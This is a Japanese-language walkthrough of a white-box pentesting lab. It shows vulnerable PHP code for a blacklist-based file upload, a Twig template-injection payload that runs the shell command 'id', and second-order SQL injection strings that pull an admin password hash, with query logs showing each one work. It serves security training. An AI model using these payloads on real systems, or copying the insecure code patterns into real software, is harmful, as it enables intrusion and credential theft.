<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [trouble1](#trouble1)
  - [file upload](#file-upload)
  - [SSTI](#ssti)
  - [SQL Injection](#sql-injection)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# trouble1
https://github.com/TROUBLE-1/White-box-pentesting  

## file upload
以下の`admin/upload.php`でfile uploadの脆弱性がある。  
```php
<html>
<body>

<?php

    if(isset($_REQUEST['upload'])){

	if($_FILES["file"]["error"])
	{
		header("Location: welcome.php");
		die();	
	}

	$notAllowed = array('php','php1','php2','php3','php4','php5','php6','php7','phtml','exe','html','cgi','asp','gif','jpeg','png','vb','inf');

	$splitFileName = explode(".", $_FILES["file"]["name"]);

	$fileExtension = end($splitFileName);

	if(in_array($fileExtension, $notAllowed))
	{
		echo "Please upload a TEXT file";
	}
	else{

		echo "Name: ".$_FILES["file"]["name"];
		echo "<br>Size: ".$_FILES["file"]["size"];
		echo "<br>Temp File: ".$_FILES["file"]["tmp_name"];
		echo "<br>Type: ".$_FILES["file"]["type"];

		move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/".$_FILES["file"]["name"]);
	}
    }

?>

</body>
</html>

```
![image](https://user-images.githubusercontent.com/56021519/112270980-b21ec280-8cbd-11eb-8d31-6188d7853b63.png)  
![image](https://user-images.githubusercontent.com/56021519/112271023-be0a8480-8cbd-11eb-9ade-8ce79aa8dedf.png)  


## SSTI
`render`で検索すると以下のようにtwigが使用されているのでSSTIの可能性  
![image](https://user-images.githubusercontent.com/56021519/112273153-5e61a880-8cc0-11eb-8b91-ae44710b4a4c.png)  
なんかコードがミスっててerrorになるので以下のように編集した。  
```php
<?php
   if (isset($_REQUEST['submit'])) {
       $name=$_REQUEST['name'];
       // include and register Twig auto-loader
       include 'twig/twig/lib/Twig/Autoloader.php';
       Twig_Autoloader::register();
       try {
             // specify where to look for templates
                 $loader = new Twig_Loader_String();  
             // initialize Twig environment
                 $twig = new Twig_Environment($loader);
            // set template variables
            // render template
               $result= $twig->render($name);
               echo "<h2 style='color:white;'>You searched for ". @$result ."</h2>";
       } catch (Exception $e) {
             die ('<h2 style="color:white;">Bad Username</h2>' );
           }
   }
   ?>
```
![image](https://user-images.githubusercontent.com/56021519/112273054-425e0700-8cc0-11eb-9d65-b70dc6478770.png)  

以下で成功！  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection  
```txt
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
![image](https://user-images.githubusercontent.com/56021519/112273908-39216a00-8cc1-11eb-9dd6-cb89f5f5c89e.png)  

## SQL Injection
ログを見ると、`BBB'`というユーザー名でRegisterした場合、以下のようにSQLInjectionできることがわかる！  
insertとselectでは違う構文でInjectionする必要があるが、その都度別のユーザー名を作成すれば任意のデータを読みだせる！  
```txt
                    70 Query    INSERT INTO user_log(username, login_date) values ('BBB'', '03/24/2021 04:04:12 am')

                    72 Query    SELECT * FROM user_log WHERE username = 'BBB''
```
`user_log.php`  
`$login_session`に`'`とかがエスケープされてない場合はSQLInjection可能！  
```php
                  if(isset($login_session)) {
               
                       $sql = "SELECT * FROM user_log WHERE username = '$login_session'";   
```
`session.php`  
`$login_session`には`BBB'`が入る！  
登録する前にPHP上では`\'`としてエスケープしていてもDBに登録する際に`'`に戻るので、それを読みだして使うとヤバい。  
```php
<?php
   include('config.php');
   session_start();
   
   $user_check = $_SESSION['login_user'];
   
   $ses_sql = mysqli_query($db,"select username from users where username = '$user_check' ");
   
   $row = mysqli_fetch_array($ses_sql,MYSQLI_ASSOC);
   
   $login_session = $row['username'];

    if(!isset($login_session)){
        header("location: index.php");
    }
?>
```
以下のように二つのユーザー名で作成するとデータを読みだせる。  
べつにinsertの方はやらなくてもよさそう。  
```txt
',version())#
                    81 Query    INSERT INTO user_log(username, login_date) values ('',version())#', '03/24/2021 04:15:11 am')
                    83 Query    SELECT * FROM user_log WHERE username = '',version())#'


' union select 1,2,3#
                    90 Query    INSERT INTO user_log(username, login_date) values ('' union select 1,2,3#', '03/24/2021 04:18:19 am')
                    92 Query    SELECT * FROM user_log WHERE username = '' union select 1,2,3#'
```
![image](https://user-images.githubusercontent.com/56021519/112277693-58ba9180-8cc5-11eb-8050-3ecbb620046d.png)  

以下でpasswordをゲット！  
```txt
' union select 1,2,(select password from admin where id=1)#

                   113 Query    SELECT * FROM user_log WHERE username = '' union select 1,2,(select password from admin where id=1)#'

21ffccddf815587ff8149a8efb1a5d86ac295d19
```

![image](https://user-images.githubusercontent.com/56021519/112279502-56f1cd80-8cc7-11eb-88ae-62be052cb08d.png)  
ログインは以下のようになっているため、`SHA1(CONCAT(password, '$passtoken'))`は計算できる！  
```php
<?php
   include("config.php");
   
   session_start();
   if (isset($_POST['token']))   
   {   
    $_SESSION['token'] = $_POST['token'];   
   }   
    else{
        if (!isset($_SESSION['token']))   
        $_SESSION['token'] = sha1(mt_rand() . microtime(TRUE));
    }
   if($_SERVER["REQUEST_METHOD"] == "POST") {     
      // username and password sent from form 
      if(isset($_POST['username'])){
          $myusername = mysqli_real_escape_string($db,$_POST['username']);
          $mypassword = mysqli_real_escape_string($db,$_POST['form_password_hidden']); 
          $passtoken = $_SESSION['token'];
          $sql = "SELECT id FROM users WHERE username = '$myusername' and SHA1(CONCAT(password, '$passtoken'))='$mypassword'";
```

